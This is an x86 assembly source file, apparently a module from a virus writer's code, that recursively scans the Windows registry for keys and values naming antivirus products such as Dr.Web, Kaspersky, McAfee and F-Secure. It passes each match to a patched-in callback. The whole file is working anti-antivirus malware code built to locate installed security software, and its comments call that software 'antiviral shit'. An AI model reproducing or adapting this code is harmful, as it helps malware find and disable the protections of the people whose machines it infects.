
; REGSCAN (c) Z0MBIE

C_MULTIKEYSIZE          equ     1024    ; max length of key\key\key string
C_SINGLEKEYSIZE         equ     256     ; max length of single key
C_VALUENAMESIZE         equ     256     ; max length of value name
C_VALUESIZE             equ     512     ; max length of value

regscan:
                        pusha

                        mov eax, [esp+8*4+4]
                        call delta
                        mov [ebp+checkbadname.callback], eax

                        sub     esp, C_MULTIKEYSIZE

                        mov     ebx, 80000000h
                        mov     edi, esp
                        mov     word [edi], '0'
  .cycle:
                        call    scankey
                        inc     byte [edi]
                        inc     ebx
                        cmp     bl, 6
                        jbe     .cycle

                        add     esp, C_MULTIKEYSIZE
                        popa
                        ret 4

; input: EBX=hKey
;        EDI=keyname

scankey:                pusha

                        xor     eax, eax
                        dec     eax
                        dec     edi
.scan0:                inc     edi
                        inc     eax
                        cmp     byte [edi], 0
                        jne     .scan0
                        cmp     eax, C_MULTIKEYSIZE-C_SINGLEKEYSIZE-1
                        jae     .quit
                        mov     al, '\'
                        stosb

                        xor     esi, esi        ; subkey index

.cycle:                push    dword C_SINGLEKEYSIZE ; cbName
                        push    edi             ; lpName
                        push    esi             ; dwIndex
                        push    ebx             ; hKey
                        call [ebp+RegEnumKeyA]
                        or      eax, eax
                        jnz     .exit

;                       mov     edx, [esp].pusha_edi
;                       call    dump_asciiz_edx
;                       call    dump_crlf

                        push    eax
                        push    esp             ; phkResult
                        push    edi             ; lpSubKey
                        push    ebx             ; hKey
                        call [ebp+RegOpenKeyA]
                        or      eax, eax
                        pop     eax             ; EAX<--hKey
                        jnz     .skip

                        xchg    edi, [esp]
                        xchg    ebx, eax
                        call    scanvalue       ; scan current key's values
                        call    scankey         ; recursivly scan subkeys
                        xchg    ebx, eax
                        xchg    edi, [esp]

                        push    eax             ; hKey
                        call [ebp+RegCloseKey]

.skip:                 inc     esi             ; subkey index
                        jmp     .cycle

.exit:                 mov     byte [edi-1], 0

.quit:                 popa
                        retn

; input: EBX=hKey
;        EDI=keyname

scanvalue:              pusha
                        sub     esp, C_VALUENAMESIZE
                        mov     edi, esp        ; EDI = ValueName
                        sub     esp, C_VALUESIZE

                        xor     esi, esi        ; value index

.cycle:                push    dword C_VALUESIZE     ; Value length
                        mov     ecx, esp
                        push    dword C_VALUENAMESIZE ; ValueName length
                        mov     edx, esp
                        push    byte 0               ; Type
                        mov     eax, esp

                        push    ecx             ; lpcbData
                        lea     ecx, [esp+16]
                        push    ecx             ; lpData
                        push    eax             ; lpType
                        push    byte 0               ; lpReserved
                        push    edx             ; lpcbValueName
                        push    edi             ; lpValueName
                        push    esi             ; dwIndex
                        push    ebx             ; hKey
                        call [ebp+RegEnumValueA]
                        or      eax, eax
                        pop     eax             ; Type
                        pop     edx             ; ValueName length
                        pop     ecx             ; Value length
                        jnz     .exit

                        cmp     eax, 1     ; Type
                        jne     .skip
;                       or      edx, edx        ; ValueName length
;                       jz      .skip
;                       or      ecx, ecx        ; Value length
;                       jz      .skip

                        mov     edx, [esp+C_VALUENAMESIZE+C_VALUESIZE].pusha_edi
                        mov     ecx, esp
                        call    checkbadname

.skip:                 inc     esi             ; value index
                        jmp     .cycle

.exit:                 add     esp, C_VALUENAMESIZE+C_VALUESIZE
                        popa
                        retn

; input: EBX=hKey
;        EDX=keyname
;        EDI=valuename (may be zero-length)
;        ECX=value     (may be zero-length)

checkbadname:           pusha

                        mov     esi, edx
                        call    findbadsubstr
                        je      .av
                        mov     esi, edi
                        call    findbadsubstr
                        je      .av
                        mov     esi, ecx
                        call    findbadsubstr
                        jne     .notav

.av:                   xchg    ecx, edx
                     mov eax, 12345678h
.callback equ $-4
                     call eax
.notav:
.exit:                 popa
                        retn

; input:  EDX,EDI,ECX=asciiz
; output: ZF==0 (jnz) -- normal strings
;         ZF==1 (jz)  -- antiviral shit

findbadsubstr:          pusha
.cycle:                mov     eax, [esi]
                        or      al, al
                        jz      .good
                        or      eax, 20202020h
; REP SCASD can help here... but, maybe i'll use permutation, so...

                        cmp     eax, "drwe"
                        jz      .bad
                        cmp     eax, "idav"
                        jz      .bad
                        cmp     eax, "kasp"
                        jz      .bad
;                        cmp     eax, "dinf"
;                        jz      .bad
                        cmp     eax, "aids"
                        jz      .bad
                        cmp     eax, "avpi"
                        jz      .bad
                        cmp     eax, "ntiv"
                        jz      .bad
                        cmp     eax, "viru"
                        jz      .bad
                        cmp     eax, "f-se"
                        jz      .bad
                        cmp     eax, "mcaf"
                        jz      .bad

                        inc     esi
                        jmp     .cycle
.good:                 inc     eax     ; ZF==0
.bad:                  popa
                        retn

